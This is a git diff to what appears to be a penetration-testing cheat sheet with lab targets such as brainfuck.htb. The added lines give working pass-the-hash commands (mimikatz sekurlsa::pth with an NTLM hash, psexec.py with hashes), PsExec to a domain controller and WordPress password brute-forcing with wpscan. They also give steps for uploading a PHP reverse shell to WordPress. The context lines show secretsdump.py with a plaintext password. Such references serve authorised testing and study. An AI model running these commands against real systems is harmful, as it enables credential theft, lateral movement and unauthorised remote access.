@@ -995,7 +995,6 @@ secretsdump.py whiterose/ealderson:Password123@192.168.92.131
 ```
 
 ## Pass The Hash
-
 Use NTHASH (LMHASH:NTHASH)
 
 ```
@@ -1011,6 +1010,15 @@ pth-winexe -U user%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c
 
 ```
 psexec.py -u "Elliot Alderson":@192.168.92.131 -hashes <lmhash:nthash>
+```
+Or
+```
+mimikatz # sekurlsa::pth /user:user /domain:domain.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
+```
+Windows:
+Create a TGT Kerberos ticket first by issuing a command that requires domain permissions (net use \\dc01)
+```
+.\PsExec.exe \\dc01 cmd.exe
 ```
 
 ## Token Impersonation
@@ -1563,6 +1571,16 @@ john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
 ```
 wpscan --url https://brainfuck.htb --disable-tls-checks
 ```
+You can also bruteforce with wpscan
+```
+wpscan --url http://url.local --passwords passwords.txt
+```
+
+## Upload Reverse Shell (Authenticated)
+1. Go to plugins and click 'upload file'
+2. upload a simple php reverse shell (e.g. laudanum's)
+3. set up listener
+4. browse to /wp-content/uploads
 
 
 # Reverse Shells
